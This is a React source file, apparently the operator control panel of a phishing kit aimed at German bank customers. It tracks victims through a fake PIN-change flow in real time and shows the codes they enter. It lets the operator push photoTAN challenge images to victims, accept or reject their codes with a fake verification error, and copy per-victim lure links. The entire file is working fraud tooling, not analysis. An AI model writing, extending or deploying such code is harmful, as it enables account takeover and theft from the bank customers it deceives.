import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { KeyRound, Link2, XCircle, CheckCircle2, Trash2, Upload, RotateCcw } from "lucide-react"; import { Share2 } from "lucide-react";
import { toast } from "sonner";
import LiveChatDialog from "./LiveChatDialog";

type PinRow = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  customer_phase: string | null;
  photo_tan_image: string | null;
  last_error: string | null;
  pin_code: string | null;
  used: boolean;
  created_at: string;
};

const PHASE_LABEL: Record<string, string> = {
  pin_aenderung: "Kunde auf Landing-Seite",
  start: "Kunde auf /pin/start – wartet auf Offline-Modus-Klick",
  phototan_request: "Offline-Modus angefordert – Bild hochladen",
  phototan: "Kunde sieht photoTAN – wartet auf Code-Eingabe",
  code_review: "Code eingegeben – bitte bestätigen",
  success: "Erfolgreich (Weitergeleitet)",
  aborted: "Abgebrochen",
};

const PinLiveCard = () => {
  const [rows, setRows] = useState<PinRow[]>([]);

  const load = async () => {
    const { data } = await (supabase as any)
      .from("pin_tokens")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(50);
    setRows(data || []);
  };

  useEffect(() => {
    load();
    const ch = (supabase as any).channel("pin_live_tokens")
      .on("postgres_changes", { event: "*", schema: "public", table: "pin_tokens" }, load)
      .subscribe();
    const iv = window.setInterval(load, 4000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch); };
  }, []);

  const update = async (id: string, patch: Record<string, any>) => {
    const { error } = await (supabase as any).from("pin_tokens").update(patch).eq("id", id);
    if (error) toast.error(error.message);
  };
  const setPhase = (r: PinRow, phase: string, extra: Record<string, any> = {}) =>
    update(r.id, { customer_phase: phase, ...extra });

  const showPhotoTan = (r: PinRow) => {
    if (!r.photo_tan_image) { toast.error("Bitte zuerst PhotoTAN-Bild hochladen"); return; }
    setPhase(r, "phototan", { last_error: null });
  };

  const rejectCode = (r: PinRow) =>
    update(r.id, { pin_code: null, customer_phase: "phototan", last_error: "Der Code konnte nicht verifiziert werden. Bitte erneut versuchen." });

  const acceptCode = (r: PinRow) => update(r.id, {
    customer_phase: "success",
    used: true,
    used_at: new Date().toISOString(),
    last_error: null,
  });

  const finishSuccess = (r: PinRow) => update(r.id, {
    customer_phase: "success",
    used: true,
    used_at: new Date().toISOString(),
    last_error: null,
  });

  const setPhotoTanImage = (r: PinRow, dataUrl: string | null) =>
    update(r.id, { photo_tan_image: dataUrl });

  const sendBackToAuth = async (r: PinRow) => {
    await setPhase(r, "aborted", { last_error: null });
    toast.success("Kunde wird zu /auth zurückgeleitet");
  };

  const remove = async (r: PinRow) => {
    if (!window.confirm("Session wirklich löschen?")) return;
    await (supabase as any).from("pin_tokens").delete().eq("id", r.id);
    toast.success("Gelöscht");
  };

  const copyLink = async (r: PinRow) => {
    const url = `${window.location.origin}/auth?token=${r.token}`;
    try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
  };

  const visible = rows.filter(r => {
    const p = r.customer_phase;
    return p && p !== "pending";
  });

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2"><KeyRound className="h-5 w-5" /> Live-Steuerung PIN-Änderung</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {!visible.length && <div className="text-sm text-muted-foreground">Keine aktiven PIN-Sessions.</div>}
        {visible.map(r => {
          const phase = r.customer_phase || "pin_aenderung";
          const done = phase === "success" || phase === "aborted";
          return (
            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${done ? "opacity-70" : ""}`}>
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2 min-w-0">
                  <span className="font-mono text-sm px-2 py-0.5 rounded bg-muted">{r.token}</span>
                  <Badge variant={done ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
                  {r.auftraggeber_name && <span className="text-sm text-muted-foreground truncate">{r.auftraggeber_name}</span>}
                </div>
                <div className="flex gap-1">
                  <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-4 w-4" /></Button>
                  <Button size="sm" variant="ghost" onClick={async () => { const u = `${window.location.origin}/chat/pin/${r.id}`; try { await navigator.clipboard.writeText(u); toast.success("Chat-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); } }} title="Chat-Link teilen"><Share2 className="h-4 w-4" /></Button>
                  <LiveChatDialog taskId={`pin:${r.id}`} label={r.auftraggeber_name || undefined} />
                  <Button size="sm" variant="ghost" onClick={() => remove(r)} title="Löschen"><Trash2 className="h-4 w-4" /></Button>
                </div>
              </div>

              <div className="text-sm">
                <div className="text-[10px] uppercase text-muted-foreground">Eingegebener Code</div>
                <div className="font-mono font-semibold">{r.pin_code || "—"}</div>
              </div>

              {!done && (
                <div className="space-y-3 pt-2 border-t">
                  {(phase === "phototan_request" || phase === "phototan" || phase === "code_review") && (
                    <StepBlock title="PhotoTAN-Bild">
                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
                    </StepBlock>
                  )}

                  <div className="flex flex-wrap justify-between gap-2">
                    <Button size="sm" variant="outline" onClick={() => sendBackToAuth(r)}>
                      <RotateCcw className="h-4 w-4 mr-1" />Kunde zurück zu /auth
                    </Button>
                    <div className="flex flex-wrap gap-2">
                      <Button size="sm" variant="default" onClick={() => finishSuccess(r)}>
                        <CheckCircle2 className="h-4 w-4 mr-1" />Direkt zu /success (5s → /auth)
                      </Button>
                      {phase === "start" && (
                        <Button size="sm" variant="default" onClick={() => finishSuccess(r)}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />Abschluss → /success
                        </Button>
                      )}
                      {phase === "phototan_request" && (
                        <Button size="sm" onClick={() => showPhotoTan(r)} disabled={!r.photo_tan_image}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
                        </Button>
                      )}
                      {(phase === "phototan" || phase === "code_review") && (
                        <>
                          <Button size="sm" variant="destructive" onClick={() => rejectCode(r)} disabled={!r.pin_code}>
                            <XCircle className="h-4 w-4 mr-1" />Code ablehnen
                          </Button>
                          <Button size="sm" onClick={() => acceptCode(r)} disabled={!r.pin_code}>
                            <CheckCircle2 className="h-4 w-4 mr-1" />Code akzeptieren → /success
                          </Button>
                        </>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </CardContent>
    </Card>
  );
};

const StepBlock = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="space-y-2">
    <div className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">{title}</div>
    {children}
  </div>
);

const PhotoTanUploader = ({ r, onSet }: { r: PinRow; onSet: (url: string | null) => void }) => {
  const inputRef = useRef<HTMLInputElement>(null);
  const [url, setUrl] = useState("");
  const [loading, setLoading] = useState(false);

  const onFile = async (f: File) => {
    const reader = new FileReader();
    reader.onload = () => onSet(String(reader.result));
    reader.readAsDataURL(f);
  };

  const onUrl = async () => {
    const u = url.trim();
    if (!u) return;
    setLoading(true);
    try {
      const { data, error } = await (supabase as any).functions.invoke("fetch-photo-tan", {
        body: { url: u, autoCrop: true },
      });
      if (error || !data?.dataUrl) throw new Error(error?.message || "Fehler");
      onSet(data.dataUrl);
      setUrl("");
      toast.success("PhotoTAN übernommen");
    } catch (e: any) {
      toast.error(e.message || "Konnte Bild nicht laden");
    } finally { setLoading(false); }
  };

  return (
    <div className="space-y-2">
      <div className="flex items-center gap-2 flex-wrap">
        <input ref={inputRef} type="file" accept="image/*" hidden
          onChange={e => { const f = e.target.files?.[0]; if (f) onFile(f); e.target.value = ""; }} />
        <Button size="sm" variant="outline" onClick={() => inputRef.current?.click()}>
          <Upload className="h-4 w-4 mr-1" />{r.photo_tan_image ? "Bild ersetzen" : "Bild hochladen"}
        </Button>
        {r.photo_tan_image && (
          <>
            <img src={r.photo_tan_image} alt="preview" className="h-10 w-10 object-contain border rounded" />
            <Button size="sm" variant="ghost" onClick={() => onSet(null)}>entfernen</Button>
          </>
        )}
        {!r.photo_tan_image && <span className="text-xs text-muted-foreground">oder Link einfügen ↓</span>}
      </div>
      <div className="flex items-center gap-2 flex-wrap">
        <Input
          value={url}
          onChange={e => setUrl(e.target.value)}
          onKeyDown={e => { if (e.key === "Enter") onUrl(); }}
          placeholder="Bild-URL (z. B. https://prnt.sc/..., direkte Bild-URL, imgur, ...)"
          className="h-8 flex-1 min-w-[220px]"
        />
        <Button size="sm" onClick={onUrl} disabled={loading || !url.trim()}>
          {loading ? "Lade..." : "Übernehmen"}
        </Button>
      </div>
    </div>
  );
};

export default PinLiveCard;
